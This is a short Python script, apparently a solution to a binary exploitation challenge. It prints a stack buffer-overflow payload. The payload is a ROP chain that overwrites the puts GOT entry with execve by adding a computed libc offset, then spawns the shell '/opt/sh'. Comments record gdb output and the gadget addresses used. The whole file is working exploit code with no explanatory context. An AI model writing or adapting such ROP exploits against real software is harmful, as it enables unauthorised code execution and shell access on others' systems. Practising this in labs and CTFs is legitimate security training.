# /usr/bin/python3

import sys

# gdb-peda$ p puts
# $1 = {int (const char *)} 0x7ffff7e3b980 <__GI__IO_puts>
# gdb-peda$ p execve
# $2 = {void (void)} 0x7ffff7e98a10 <__GI_execve>
# gdb-peda$ p/x $2-$1
# $3 = 0x5d090

# disas 0x401030 (puts call)
# puts GOT 0x404000

# 0x0000000000401160: pop rcx; ret;
# 0x000000000040115e: pop rdx; ret;
# 0x0000000000401168: add qword ptr [rcx], rdx; ret;
# 0x0000000000401156: push rbp; mov rbp, rsp; pop rdi; ret;
# 0x000000000040115c: pop rsi; ret;

sys.stdout.buffer.write(b"A"*128 +
                        b"\x00\x00\x00\x00\x00\xac\xce\xde"[::-1] +
                        b"\x00\x00\x00\x00\x00\xac\xce\x55"[::-1] +
                        b"/opt/sh\0" +
                        b"\x00\x00\x00\x00\x00\x40\x11\x60"[::-1] +
                        b"\x00\x00\x00\x00\x00\x40\x40\x00"[::-1] +
                        b"\x00\x00\x00\x00\x00\x40\x11\x5e"[::-1] +
                        b"\x00\x00\x00\x00\x00\x05\xd0\x90"[::-1] +
                        b"\x00\x00\x00\x00\x00\x40\x11\x68"[::-1] + 
                        b"\x00\x00\x00\x00\x00\x40\x11\x56"[::-1] +
                        b"\x00\x00\x00\x00\x00\x40\x11\x56"[::-1] +
                        b"\x00\x00\x00\x00\x00\x40\x11\x5c"[::-1] +
                        b"\x00"*8 +
                        b"\x00\x00\x00\x00\x00\x40\x11\x5e"[::-1] +
                        b"\x00"*8 +
                        b"\x00\x00\x00\x00\x00\x40\x10\x30"[::-1]);